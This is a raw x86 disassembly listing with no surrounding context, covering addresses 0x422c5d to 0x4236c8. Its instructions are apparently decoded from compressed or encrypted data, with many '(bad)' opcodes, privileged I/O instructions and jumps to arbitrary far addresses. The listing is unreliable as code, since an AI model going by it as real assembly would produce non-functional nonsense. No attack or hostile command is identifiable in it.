  422c5d:	cmp    ebx,DWORD PTR [ecx+ecx*8+0x449d9ae8]
  422c64:	pop    ds
  422c65:	mov    edx,0x1dc2cd6
  422c6a:	push   ss
  422c6b:	fdivp  st(4),st
  422c6d:	dec    edx
  422c6e:	ds aaa 
  422c70:	xchg   ebx,eax
  422c71:	gs (bad) 
  422c73:	arpl   di,di
  422c75:	and    ecx,ecx
  422c77:	lock jbe 0x422c56
  422c7a:	and    dl,BYTE PTR [edi]
  422c7c:	ja     0x422c3f
  422c7e:	push   edx
  422c7f:	xor    BYTE PTR [eax],ch
  422c81:	mov    edi,0xdc35d7d5
  422c86:	ds push ds
  422c88:	rcr    DWORD PTR [ecx+0x1b],1
  422c8b:	and    cx,WORD PTR [eax]
  422c8e:	lds    eax,FWORD PTR [edx]
  422c90:	jge    0x422c9a
  422c92:	je     0x422ca8
  422c94:	inc    edx
  422c95:	push   ds
  422c96:	lods   al,BYTE PTR ds:[esi]
  422c97:	pop    ecx
  422c98:	mov    ds:0x13105c0c,al
  422c9d:	js     0x422d1a
  422c9f:	dec    eax
  422ca0:	ficom  DWORD PTR [esi]
  422ca2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ca3:	retf   
  422ca4:	pushf  
  422ca5:	dec    edx
  422ca6:	inc    esi
  422ca7:	lock cwde 
  422ca9:	xor    al,0x84
  422cab:	clc    
  422cac:	scas   eax,DWORD PTR es:[edi]
  422cad:	gs out 0xb6,al
  422cb0:	aad    0x32
  422cb2:	cdq    
  422cb3:	adc    DWORD PTR [eax+ecx*2+0x60],esp
  422cb7:	repnz pop eax
  422cb9:	mov    ds:0x7af41be8,al
  422cbe:	and    al,0x2b
  422cc0:	add    eax,0x9791b19d
  422cc5:	adc    al,0xf9
  422cc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422cc8:	cld    
  422cc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422cca:	push   eax
  422ccb:	xor    bh,BYTE PTR [eax]
  422ccd:	aas    
  422cce:	call   0x2ffc:0x485e62f9
  422cd5:	daa    
  422cd6:	add    eax,0xc8cb67da
  422cdb:	jno    0x422d0e
  422cdd:	push   0x1e
  422cdf:	xchg   ebx,eax
  422ce0:	dec    esi
  422ce1:	or     DWORD PTR [eax-0x14],ebp
  422ce4:	js     0x422d42
  422ce6:	mov    ecx,0xac3c5157
  422ceb:	add    ecx,DWORD PTR [ecx]
  422ced:	je     0xc8297c70
  422cf3:	pop    ebp
  422cf4:	hlt    
  422cf5:	mov    al,ds:0x953d425b
  422cfa:	dec    edi
  422cfb:	dec    edi
  422cfc:	jmp    0xda359b55
  422d01:	imul   eax,ebx,0x9eac573b
  422d07:	dec    esp
  422d08:	mov    ecx,0x5ac89bd0
  422d0d:	pop    ebp
  422d0e:	xchg   ebx,eax
  422d0f:	dec    edi
	...
  422d74:	mov    edi,0x626d60bd
  422d79:	std    
  422d7a:	mov    edi,0x80797fff
  422d7f:	sub    esi,DWORD PTR [edx]
  422d81:	push   ss
  422d82:	or     eax,0x17358f3
  422d87:	add    BYTE PTR [ecx+eax*1],al
  422d8a:	add    BYTE PTR [eax],al
  422d8c:	jmp    DWORD PTR [eax+0x56]
  422d8f:	dec    esi
  422d90:	(bad)  
  422d91:	sub    al,0x2d
  422d93:	and    DWORD PTR [edx],edi
  422d95:	dec    ecx
  422d96:	out    dx,al
  422d97:	mov    ebp,0x55219281
  422d9c:	retf   
  422d9d:	mov    esi,0x41aa0c76
  422da2:	inc    edi
  422da3:	out    dx,eax
  422da4:	ins    DWORD PTR es:[edi],dx
  422da5:	push   0xbc922ab7
  422daa:	mov    dl,0x3
  422dac:	ret    
  422dad:	fidivr DWORD PTR [ecx+ecx*1+0x1]
  422db1:	cmc    
  422db2:	aad    0x71
  422db4:	push   ebp
  422db5:	aam    0xa3
  422db7:	or     esp,0x44
  422dba:	sub    BYTE PTR [ebx+0x25632026],al
  422dc0:	xchg   edx,eax
  422dc1:	cdq    
  422dc2:	jecxz  0x422d56
  422dc4:	mov    al,0x6d
  422dc6:	mov    esi,0x5c5ce879
  422dcb:	(bad)  
  422dcc:	je     0x422dc3
  422dce:	retf   
  422dcf:	jns    0x422e0b
  422dd1:	es loope 0x422e34
  422dd4:	or     al,0xf8
  422dd6:	dec    edx
  422dd7:	leave  
  422dd8:	adc    DWORD PTR [eax],0xffffffc2
  422ddb:	push   es
  422ddc:	and    WORD PTR [ecx-0x660d81d0],ax
  422de3:	icebp  
  422de4:	inc    ebx
  422de5:	shr    BYTE PTR [edx+0x1],cl
  422de8:	dec    edx
  422de9:	and    BYTE PTR [ebp-0x15],0x64
  422ded:	sti    
  422dee:	rep outs dx,BYTE PTR ds:[esi]
  422df0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422df1:	imul   edi,DWORD PTR [ebp-0x3f],0x68
  422df5:	hlt    
  422df6:	or     ebx,DWORD PTR ds:0xc99cda7d
  422dfc:	data16 out 0xa7,al
  422dff:	pop    eax
  422e00:	jecxz  0x422e31
  422e02:	fdiv   QWORD PTR [edx-0x5617e130]
  422e08:	xchg   edx,eax
  422e09:	out    dx,al
  422e0a:	mov    bl,0xe8
  422e0c:	pop    es
  422e0d:	scas   al,BYTE PTR es:[edi]
  422e0e:	call   0xd870:0x39abe76e
  422e15:	les    ebp,FWORD PTR [esi]
  422e17:	cmp    BYTE PTR [eax-0x1],0x4b
  422e1b:	in     eax,0xbb
  422e1d:	cwd    
  422e1f:	xlat   BYTE PTR ds:[ebx]
  422e21:	or     eax,0x57a61c2e
  422e26:	icebp  
  422e27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e28:	add    dl,BYTE PTR [eax-0x27a69b07]
  422e2e:	cmp    BYTE PTR [edx],ah
  422e30:	(bad)  
  422e31:	mov    ebx,0x6844ef7c
  422e36:	dec    ebx
  422e37:	push   0x781e7de6
  422e3c:	mov    ecx,0xa23f7513
  422e41:	mov    cs,WORD PTR gs:[eax-0x4a44d068]
  422e48:	ja     0x422dd3
  422e4a:	rcl    DWORD PTR [ebx],0xd1
  422e4d:	xor    al,ch
  422e4f:	and    esp,DWORD PTR [eax]
  422e51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e52:	in     eax,dx
  422e53:	in     al,0x79
  422e55:	mov    al,ds:0xb35df10a
  422e5a:	xchg   esi,eax
  422e5b:	sub    bl,BYTE PTR [esi-0x3a]
  422e5e:	push   esi
  422e5f:	sub    DWORD PTR [ebx+0x57],ebx
  422e62:	and    al,0x0
  422e64:	out    dx,al
  422e65:	dec    edx
  422e66:	enter  0x520f,0xc3
  422e6a:	hlt    
  422e6b:	fwait
  422e6c:	pop    edi
  422e6d:	xchg   esi,eax
  422e6e:	mov    al,0xc7
  422e70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e71:	enter  0xfbf8,0xcc
  422e75:	mov    esi,0x4d181045
  422e7a:	jp     0x422e1d
  422e7c:	mov    DWORD PTR [ebp-0x6],ebp
  422e7f:	pop    ecx
  422e80:	popa   
  422e81:	or     eax,0xc829e142
  422e86:	stos   BYTE PTR es:[edi],al
  422e87:	pop    ds
  422e88:	pop    edx
  422e89:	push   0xffffffd2
  422e8b:	repz and eax,0x3914eb
	...
  422ef1:	add    BYTE PTR [eax],al
  422ef3:	add    BYTE PTR [ebx-0x21e677ab],al
  422ef9:	fst    QWORD PTR [ebx+0x33b808df]
  422eff:	retf   0x2ca4
  422f02:	ss call 0x43a364
  422f08:	add    al,0x1
  422f0a:	add    BYTE PTR [eax],al
  422f0c:	je     0x422f4f
  422f0e:	(bad)  
  422f0f:	adc    ah,dl
  422f11:	into   
  422f12:	sbb    eax,0x28c447cc
  422f17:	fadd   QWORD PTR [ecx-0x3e]
  422f1a:	sbb    esi,esp
  422f1c:	lods   eax,DWORD PTR ds:[esi]
  422f1d:	adc    eax,0x92e7d3a1
  422f22:	int    0x6b
  422f24:	adc    eax,0x4459c4ab
  422f29:	fucom  st(2)
  422f2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f2c:	lods   eax,DWORD PTR ds:[esi]
  422f2d:	pop    edi
  422f2e:	es mov ch,0xac
  422f31:	jecxz  0x422eca
  422f33:	pop    esi
  422f34:	jnp    0x422ee6
  422f36:	clc    
  422f37:	iret   
  422f38:	push   ebp
  422f39:	inc    eax
  422f3a:	push   es
  422f3b:	sub    ebp,DWORD PTR [ebx]
  422f3d:	add    edx,esp
  422f3f:	pop    ss
  422f40:	call   eax
  422f42:	out    0x8a,al
  422f44:	add    BYTE PTR [edi+0x643802fe],ch
  422f4a:	dec    edi
  422f4b:	cli    
  422f4c:	pop    edx
  422f4d:	inc    edx
  422f4e:	aaa    
  422f4f:	jmp    0x422f24
  422f51:	mov    BYTE PTR [ecx-0x35],bh
  422f54:	popa   
  422f55:	ficomp DWORD PTR [eax]
  422f57:	adc    eax,0x5c25430a
  422f5c:	gs jl  0x422f32
  422f5f:	pop    ebx
  422f60:	(bad)  
  422f61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f62:	ss daa 
  422f64:	xchg   esp,eax
  422f65:	mov    bl,0x8d
  422f67:	mov    ebx,0x16c5abc8
  422f6c:	adc    DWORD PTR [esi+0x7],edx
  422f6f:	dec    ecx
  422f70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f71:	mov    ebp,0x99fd1f0e
  422f76:	and    DWORD PTR [edx-0x2a04ec0a],edx
  422f7c:	pop    edx
  422f7d:	out    dx,al
  422f7e:	test   BYTE PTR [ecx+0x3d],bh
  422f81:	outs   dx,BYTE PTR ds:[esi]
  422f82:	retf   0x5367
  422f85:	cmp    ch,BYTE PTR [ebx+0x50]
  422f88:	mov    eax,ds:0xb8c82f6b
  422f8d:	push   0x35
  422f8f:	not    BYTE PTR [ebx+esi*4+0x3c92a52b]
  422f96:	mov    edx,ebp
  422f98:	push   cs
  422f99:	loopne 0x422f98
  422f9b:	(bad)  
  422f9c:	xchg   esi,eax
  422f9d:	jl     0x422f5f
  422f9f:	retf   
  422fa0:	jge    0x422f98
  422fa2:	popa   
  422fa3:	test   DWORD PTR [edi],ecx
  422fa5:	pop    edx
  422fa6:	xor    eax,DWORD PTR [edi-0x18]
  422fa9:	vcvtsi2sd xmm3,xmm5,DWORD PTR [ebx-0x36034fb0]
  422fb1:	(bad)  
  422fb2:	jecxz  0x422f4b
  422fb4:	arpl   dx,bp
  422fb6:	add    eax,0xb87f430f
  422fbb:	sbb    ecx,DWORD PTR [edi+0x6c]
  422fbe:	inc    edx
  422fbf:	mov    ah,BYTE PTR [esi+0x8]
  422fc2:	scas   al,BYTE PTR es:[edi]
  422fc3:	dec    bx
  422fc5:	leave  
  422fc6:	jnp    0x422f6b
  422fc8:	call   0x206104e1
  422fcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422fce:	jl     0x423003
  422fd0:	fisubr WORD PTR [eax-0x4d0db851]
  422fd6:	shl    DWORD PTR [edi],1
  422fd8:	pop    ss
  422fd9:	pop    edi
  422fda:	adc    ebp,esp
  422fdc:	jmp    0x956:0xcac85595
  422fe3:	shl    BYTE PTR [eax],cl
  422fe5:	retf   
  422fe6:	pop    esp
  422fe7:	add    al,BYTE PTR [ecx]
  422fe9:	enter  0xb3e1,0xf4
  422fed:	aad    0xd1
  422fef:	out    0xf9,al
  422ff1:	(bad)  
  422ff3:	mov    bh,0xe2
  422ff5:	enter  0x7b38,0x3a
  422ff9:	xor    ch,BYTE PTR [ebx+0x15851673]
  422fff:	cdq    
  423000:	test   eax,0x940c3b2d
  423005:	ror    BYTE PTR [edx],cl
  423007:	cdq    
  423008:	xchg   esp,ebp
  42300a:	rol    DWORD PTR [edx+0x607548c5],0x0
	...
  423071:	add    BYTE PTR [eax],al
  423073:	add    BYTE PTR [esi-0x1c],al
  423076:	bound  ecx,QWORD PTR [eax-0x1111711e]
  42307c:	sub    ecx,ebx
  42307e:	sbb    DWORD PTR [ebp+eax*4+0x60df3b3c],esp
  423085:	jne    0x423088
  423087:	add    BYTE PTR [ecx+eax*1],al
  42308a:	add    BYTE PTR [eax],al
  42308c:	dec    ebp
  42308d:	jp     0x42309d
  42308f:	and    esp,edi
  423091:	shl    DWORD PTR [eax-0x1e93411a],cl
  423097:	jle    0x423084
  423099:	push   esi
  42309a:	mov    ebp,0xecfc6a23
  42309f:	sbb    al,0x6
  4230a1:	sahf   
  4230a2:	into   
  4230a3:	test   ebp,ebx
  4230a5:	pop    ds
  4230a6:	jae    0x423057
  4230a8:	not    DWORD PTR [ecx-0x50dc911e]
  4230ae:	in     al,0x35
  4230b0:	push   esi
  4230b1:	mov    esp,DWORD PTR [edi+ecx*2]
  4230b4:	(bad)  
  4230b5:	in     al,0x97
  4230b7:	add    al,0xbb
  4230b9:	sbb    al,0x13
  4230bc:	ret    0x6296
  4230bf:	xchg   esp,eax
  4230c0:	push   ebx
  4230c1:	dec    ebx
  4230c2:	inc    dh
  4230c4:	adc    eax,0x8a0d95b8
  4230c9:	inc    ecx
  4230ca:	imul   ebp,esi,0x54
  4230cd:	jecxz  0x423125
  4230cf:	adc    eax,0xb2ff638
  4230d4:	sub    al,0x6c
  4230d6:	rol    DWORD PTR [ebx+0x1f],cl
  4230d9:	mov    al,ds:0x53b00e76
  4230de:	data16 rcl dh,1
  4230e1:	dec    edx
  4230e2:	adc    al,0x35
  4230e4:	jbe    0x423143
  4230e6:	and    al,0x7d
  4230e8:	mov    bl,0x78
  4230ea:	mov    ebx,0x96b88c7c
  4230ef:	pop    edx
  4230f0:	mov    eax,0xb86ebef9
  4230f5:	mov    edi,esp
  4230f7:	ins    DWORD PTR es:[edi],dx
  4230f8:	call   0xbc306011
  4230fd:	dec    ebx
  4230fe:	pop    esp
  4230ff:	test   eax,0xb989b0bd
  423104:	aam    0xd5
  423106:	mov    edx,DWORD PTR [edi]
  423108:	push   ebp
  423109:	pop    ebp
  42310a:	shr    BYTE PTR [edi+ebp*1],0x46
  42310e:	retf   
  42310f:	jmp    0xe32e:0xba73e81b
  423116:	fld    st(5)
  423118:	xor    ebx,DWORD PTR [ecx]
  42311a:	pop    edi
  42311b:	add    al,BYTE PTR [edx+edx*8+0x34]
  42311f:	xor    esp,DWORD PTR [ecx]
  423121:	pop    ebp
  423122:	mov    esi,0x550578a1
  423127:	ja     0x423103
  423129:	mov    ebx,0x3e339779
  42312e:	inc    edx
  42312f:	hlt    
  423130:	pop    ss
  423131:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423132:	mov    DWORD PTR [ecx-0x58],esp
  423135:	inc    ecx
  423136:	in     al,0xf4
  423138:	mov    ebx,0xd16101e
  42313d:	sub    edi,DWORD PTR [ebp+0x7cf4ca77]
  423143:	sub    esp,DWORD PTR [esi-0x17]
  423146:	imul   edi,DWORD PTR [ebx],0x80dd0521
  42314c:	dec    esp
  42314d:	mov    DWORD PTR [edi+esi*8+0x67ec0e4e],edx
  423154:	and    ebx,DWORD PTR [edx+0x4c]
  423157:	cmp    bl,al
  423159:	inc    esi
  42315a:	sbb    DWORD PTR [eax-0x35],ebx
  42315d:	loope  0x423136
  42315f:	mov    gs,WORD PTR [ebx]
  423161:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423162:	or     eax,0x59320f54
  423167:	xchg   ecx,eax
  423168:	js     0x423150
  42316a:	adc    al,0x77
  42316c:	arpl   WORD PTR [edx-0x1b],ax
  42316f:	xlat   BYTE PTR ds:[ebx]
  423170:	add    al,0x6e
  423172:	mov    edi,0xc84ec93e
  423177:	rdpmc  
  423179:	jae    0x423129
  42317b:	int    0x3b
  42317d:	and    esp,esi
  42317f:	xchg   ebx,eax
  423180:	mov    WORD PTR [ebx],ss
  423182:	xor    bh,BYTE PTR [edi]
  423184:	lahf   
  423185:	xchg   DWORD PTR [ebx+0xb7444de],eax
  42318b:	fstp   DWORD PTR ds:0x54848c
	...
  4231f1:	add    BYTE PTR [eax],al
  4231f3:	add    BYTE PTR [ecx-0xf],bh
  4231f6:	div    DWORD PTR [ecx-0x6804801]
  4231fc:	in     al,0xe0
  4231fe:	sub    DWORD PTR [edx-0x77ca93e3],esp
  423204:	fs jbe 0x423208
  423207:	add    BYTE PTR [ecx+eax*1],al
  42320a:	add    BYTE PTR [eax],al
  42320c:	lods   al,BYTE PTR ds:[esi]
  42320d:	pop    ds
  42320e:	popf   
  42320f:	fcmovne st,st(2)
  423211:	jge    0x423254
  423213:	sub    DWORD PTR [ebx+0x5c8daded],esi
  423219:	(bad)  
  42321a:	call   0x2f278d79
  42321f:	mov    DWORD PTR [esi+0xc],edi
  423222:	inc    esi
  423223:	mul    BYTE PTR [eax]
  423225:	jmp    0x9de9:0x4c80d724
  42322c:	in     al,dx
  42322d:	fadd   QWORD PTR [ebp+0x28ab2634]
  423233:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423234:	sub    BYTE PTR [edi-0x7f46e069],dl
  42323a:	mov    WORD PTR [edi-0x7],gs
  42323d:	retf   0xffd
  423240:	lods   al,BYTE PTR ds:[esi]
  423241:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423242:	dec    ebx
  423243:	out    0xe1,eax
  423245:	sub    BYTE PTR [esi+0x79],0x9e
  423249:	mov    esi,0x47dbd62e
  42324e:	fild   QWORD PTR ds:[esi-0x70d57866]
  423255:	push   esp
  423256:	xor    eax,0x8812355d
  42325b:	add    BYTE PTR [eax+edx*2+0x30],bh
  42325f:	aas    
  423260:	pop    eax
  423261:	xchg   esp,eax
  423262:	mov    ch,0xad
  423264:	mov    esi,0x87487ed5
  423269:	fwait
  42326a:	daa    
  42326b:	push   esi
  42326c:	lds    edi,FWORD PTR [ebx-0x697b323e]
  423272:	cli    
  423273:	jmp    0x9659bea9
  423278:	fsub   QWORD PTR [ebx-0x60]
  42327b:	adc    DWORD PTR [ecx+0x47],edx
  42327e:	adc    ebx,DWORD PTR [esi]
  423280:	mov    ch,0x4d
  423282:	push   0x1d
  423284:	ins    DWORD PTR es:[edi],dx
  423285:	mov    ss,WORD PTR [ebx-0x101eac9d]
  42328b:	mov    al,ds:0x34a5a1e9
  423290:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423291:	stos   BYTE PTR es:[edi],al
  423292:	dec    ebx
  423293:	dec    edi
  423294:	jmp    0x4232fa
  423296:	mov    al,ds:0x6d86f1ed
  42329b:	cld    
  42329c:	aam    0xda
  42329e:	push   edx
  42329f:	or     eax,0xb7ab36
  4232a4:	dec    ecx
  4232a5:	test   BYTE PTR [ebp-0x6cb8af7c],cl
  4232ab:	inc    esp
  4232ac:	test   eax,0x5a6c594a
  4232b1:	lds    esi,FWORD PTR [eax+0x37]
  4232b4:	jmp    0x4232bb
  4232b6:	pusha  
  4232b7:	pop    ebp
  4232b8:	or     edi,eax
  4232ba:	ficomp DWORD PTR [esi]
  4232bc:	mov    ds:0xda51e861,eax
  4232c1:	sti    
  4232c2:	and    dl,ah
  4232c4:	or     ah,BYTE PTR [edx+edi*1-0x27]
  4232c8:	inc    ebp
  4232c9:	and    dh,BYTE PTR [esp+eax*1-0x37]
  4232cd:	add    al,0xa2
  4232cf:	sub    dh,al
  4232d1:	js     0x423313
  4232d3:	push   edx
  4232d4:	ds iret 
  4232d6:	mov    WORD PTR [edi*1+0x168083a5],ss
  4232dd:	test   DWORD PTR [edx+ecx*8+0x316cebd4],edx
  4232e4:	daa    
  4232e5:	push   edi
  4232e6:	sub    al,0x1
  4232e8:	das    
  4232e9:	sub    al,0xe0
  4232eb:	scas   al,BYTE PTR es:[edi]
  4232ec:	sar    BYTE PTR [esi],cl
  4232ee:	jecxz  0x4232bb
  4232f0:	and    eax,0x1afa6ef
  4232f5:	xor    ebx,edi
  4232f7:	cmc    
  4232f8:	jg     0x4232aa
  4232fa:	pop    edx
  4232fb:	cwde   
  4232fc:	cdq    
  4232fd:	mov    esp,0x59b329f3
  423302:	jnp    0x4232b9
  423304:	and    dh,BYTE PTR es:[ebx-0x3a]
  423308:	je     0x42335a
  42330a:	or     edx,DWORD PTR [eax]
  42330c:	arpl   WORD PTR [ebp-0x65],bx
  42330f:	imul   eax,DWORD PTR [eax],0x0
	...
  423371:	add    BYTE PTR [eax],al
  423373:	add    al,bh
  423375:	fisub  WORD PTR [edx+0x30]
  423378:	mov    sp,0xdefa
  42337c:	mov    eax,fs:0xb6590f44
  423382:	loop   0x423304
  423384:	push   0x4000177
  423389:	add    DWORD PTR [eax],eax
  42338b:	add    BYTE PTR ds:0x1cdd6742,dh
  423391:	neg    eax
  423393:	dec    ecx
  423394:	push   cs
  423395:	iret   
  423396:	cmovge ebx,eax
  423399:	call   0x2ea2423d
  42339e:	mov    eax,0xd1619f2b
  4233a3:	jecxz  0x423401
  4233a5:	gs inc ebx
  4233a7:	jns    0x423371
  4233a9:	cdq    
  4233aa:	popa   
  4233ab:	mov    ebp,0x631e4b8e
  4233b0:	mov    ebp,0xd29a57ac
  4233b5:	pop    es
  4233b6:	scas   al,BYTE PTR es:[edi]
  4233b7:	add    al,0xf4
  4233b9:	test   eax,0x875d9aa0
  4233be:	arpl   WORD PTR [esi+0x3289191f],dx
  4233c4:	mov    dl,0x60
  4233c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4233c7:	stos   DWORD PTR es:[edi],eax
  4233c8:	jl     0x423369
  4233ca:	fcom   st(1)
  4233cc:	lock sahf 
  4233ce:	xchg   ebx,eax
  4233cf:	inc    edi
  4233d0:	add    BYTE PTR [ebp-0x118a7e0d],dl
  4233d6:	cld    
  4233d7:	retf   
  4233d8:	mov    WORD PTR [esi+edx*2-0x29],?
  4233dc:	dec    BYTE PTR [edx+0x136d6248]
  4233e2:	popa   
  4233e3:	hlt    
  4233e4:	frstor [eax-0x1a]
  4233e7:	fimul  WORD PTR ds:0xaf6de1ca
  4233ed:	cmp    DWORD PTR ds:0x318615d8,edi
  4233f3:	ret    0xd8f4
  4233f6:	aad    0xa
  4233f8:	and    eax,0x3d1c5925
  4233fd:	ins    DWORD PTR es:[edi],dx
  4233fe:	sub    eax,0x41c73975
  423403:	pop    esi
  423404:	pop    ds
  423405:	sub    ebp,DWORD PTR [edx-0x193afe01]
  42340b:	cld    
  42340c:	cmp    DWORD PTR [ebx],esi
  42340e:	loopne 0x42345d
  423410:	mov    al,ds:0x8029d30b
  423415:	mov    al,ds:0x99d54a01
  42341a:	mov    esi,0x7bb5fe5b
  42341f:	ja     0x42342f
  423421:	xor    al,0xd0
  423423:	ja     0x4233e1
  423425:	cmp    esp,edi
  423427:	cmc    
  423428:	int3   
  423429:	les    edx,FWORD PTR fs:[esi+edx*2-0x344826c7]
  423431:	mov    BYTE PTR [esi+eax*1-0x77],al
  423435:	mov    ds:0x4877381a,eax
  42343a:	in     al,dx
  42343b:	jo     0x4233e5
  42343d:	and    DWORD PTR [ebx+0x12f5a050],eax
  423443:	arpl   WORD PTR [edi],si
  423445:	xor    eax,0x71607a6a
  42344a:	jae    0x4234be
  42344c:	or     BYTE PTR [ebx+0x7e],ah
  42344f:	rol    BYTE PTR [ecx-0x289720b],0x3a
  423456:	push   esi
  423457:	cwde   
  423458:	ins    DWORD PTR es:[edi],dx
  423459:	pop    es
  42345a:	jb     0x42346d
  42345c:	shl    DWORD PTR [ebx+0x1a],1
  42345f:	loop   0x42345b
  423461:	pop    ebx
  423462:	and    dl,BYTE PTR [ecx+0x791c3c8a]
  423468:	mov    dh,0x37
  42346a:	and    edx,esi
  42346c:	(bad)  
  42346e:	into   
  42346f:	out    0x19,al
  423471:	mov    al,0xfe
  423473:	(bad)  
  423474:	jecxz  0x4234e2
  423476:	mov    ebx,0xbad45e8c
  42347b:	dec    eax
  42347c:	out    0x1e,al
  42347e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42347f:	push   edx
  423480:	out    0xae,al
  423482:	repnz aad 0x91
  423485:	xchg   ecx,ecx
  423487:	cmp    DWORD PTR ds:0xf35b7fac,0x3a9f95
	...
  4234f1:	add    BYTE PTR [eax],al
  4234f3:	add    al,al
  4234f5:	mov    al,0x45
  4234f7:	outs   dx,DWORD PTR ds:[esi]
  4234f8:	jne    0x4234f9
  4234fa:	jmp    0x471f:0xadf467bf
  423501:	or     ah,BYTE PTR [edi+0x1786c1f]
  423507:	add    BYTE PTR [ecx+eax*1],al
  42350a:	add    BYTE PTR [eax],al
  42350c:	popa   
  42350d:	mov    bl,0xfc
  42350f:	test   BYTE PTR [edi-0x5756fce8],al
  423515:	ds jo  0x4234f8
  423518:	add    DWORD PTR [edi-0x47],0x3d
  42351c:	jo     0x423535
  42351e:	or     ebx,DWORD PTR [ebx]
  423520:	push   edi
  423521:	xor    DWORD PTR [esi-0x7fe40832],ecx
  423527:	cli    
  423528:	cmp    esi,DWORD PTR [ecx+eiz*8]
  42352b:	fisub  DWORD PTR [edx+0x42]
  42352e:	dec    edi
  42352f:	inc    eax
  423530:	dec    eax
  423531:	jge    0x423564
  423533:	fdivr  DWORD PTR [edx+0x4a]
  423536:	xor    bh,BYTE PTR [eax]
  423538:	(bad)  
  423539:	in     al,0x6d
  42353b:	adc    eax,0x2f9b7ffc
  423540:	or     bh,BYTE PTR [ebx-0x75]
  423543:	mov    esi,0x2b9ff2c9
  423548:	lahf   
  423549:	int3   
  42354a:	mov    BYTE PTR [edx-0x242f33ed],bl
  423550:	push   ebp
  423551:	mov    eax,gs
  423553:	xlat   BYTE PTR ds:[ebx]
  423554:	enter  0x16a7,0x7d
  423558:	ss ret 
  42355a:	int    0x87
  42355c:	add    ch,BYTE PTR [edx+0xfb3277f]
  423562:	mov    ebp,edx
  423564:	cld    
  423565:	sbb    BYTE PTR [edi+0x31],dh
  423568:	call   0x48f5:0x9c8e796d
  42356f:	rol    DWORD PTR [eax+0xb],0x7
  423573:	aas    
  423574:	test   al,0x20
  423576:	scas   eax,DWORD PTR es:[edi]
  423577:	leave  
  423578:	std    
  423579:	mov    eax,ds:0x55e3772c
  42357e:	adc    esp,esi
  423580:	sbb    bh,bh
  423582:	into   
  423583:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423584:	and    ah,bl
  423586:	cmp    BYTE PTR [esi-0x70],0x23
  42358a:	lods   al,BYTE PTR ds:[esi]
  42358b:	jp     0x423600
  42358d:	mov    eax,es:0x196ea9b0
  423593:	les    edx,FWORD PTR [edi+0x5e]
  423596:	pop    eax
  423597:	jle    0x423583
  423599:	(bad)  [edx-0x50907040]
  42359f:	mov    esi,0xefd48e37
  4235a4:	push   cs
  4235a5:	(bad)  [esi+0x235cdc03]
  4235ab:	inc    ebp
  4235ac:	sar    esp,1
  4235ae:	push   eax
  4235af:	push   es
  4235b0:	mov    edi,0x3c201d06
  4235b5:	mov    bh,0x10
  4235b7:	mov    al,0x9c
  4235b9:	les    esi,FWORD PTR [edx+0x31]
  4235bc:	push   ebp
  4235bd:	inc    ecx
  4235be:	ror    DWORD PTR [edi+0x5f],cl
  4235c1:	or     ah,BYTE PTR ds:0x2c0de486
  4235c7:	into   
  4235c8:	xor    ebp,ebp
  4235ca:	and    DWORD PTR [ecx+0x4fefda9a],ebp
  4235d0:	repz jecxz 0x423584
  4235d3:	sahf   
  4235d4:	jns    0x42364f
  4235d6:	popf   
  4235d7:	pop    edx
  4235d8:	jnp    0x4235cf
  4235da:	xchg   ebp,eax
  4235db:	fld    TBYTE PTR [esi+0x70fedd9f]
  4235e1:	dec    esp
  4235e2:	nop
  4235e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4235e4:	nop
  4235e5:	sub    al,0xb0
  4235e7:	stc    
  4235e8:	and    esp,DWORD PTR [ecx+0x2dd5d2a]
  4235ee:	sub    bh,al
  4235f0:	sub    DWORD PTR [eax+edi*8],edi
  4235f3:	dec    eax
  4235f4:	(bad)  
  4235f5:	pusha  
  4235f6:	cmovae ebx,DWORD PTR ds:0x277db124
  4235fd:	(bad)  
  4235fe:	xor    bh,cl
  423600:	mov    WORD PTR [esi+0x53],cs
  423603:	ds popa 
  423605:	repz xchg ebx,eax
  423607:	out    dx,eax
  423608:	pop    edx
  423609:	ins    DWORD PTR es:[edi],dx
  42360a:	jecxz  0x4235c8
  42360c:	push   0xffffffe3
  42360e:	pop    esp
  42360f:	cmp    al,BYTE PTR [eax]
	...
  423671:	add    BYTE PTR [eax],al
  423673:	add    BYTE PTR [eax+0x7f747c8f],al
  423679:	test   DWORD PTR [eax+0x7c916eff],0x4b88c413
  423683:	cdq    
  423684:	jo     0x4236ff
  423686:	add    DWORD PTR [eax],eax
  423688:	add    al,0x1
  42368a:	add    BYTE PTR [eax],al
  42368c:	xor    eax,0xd1043b49
  423691:	xchg   DWORD PTR [esi-0x77],edx
  423694:	cmp    eax,0xb8a15113
  423699:	jmp    0x51d3:0x2a829744
  4236a0:	arpl   WORD PTR [eax],si
  4236a2:	nop
  4236a3:	aaa    
  4236a4:	jge    0x423679
  4236a6:	imul   edi,DWORD PTR [ebp-0x3b],0x5e
  4236aa:	cli    
  4236ab:	mov    dh,0x36
  4236ad:	sub    eax,ebx
  4236af:	pusha  
  4236b0:	enter  0xef20,0xd6
  4236b4:	jge    0x4236b5
  4236b6:	in     al,0x2
  4236b8:	fimul  WORD PTR [ebx+0x41efe4c3]
  4236be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4236bf:	fld    DWORD PTR [edx]
  4236c1:	xchg   edi,eax
  4236c2:	and    esp,edi
  4236c4:	sbb    al,0xc9
  4236c6:	or     BYTE PTR [edx],dh
  4236c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
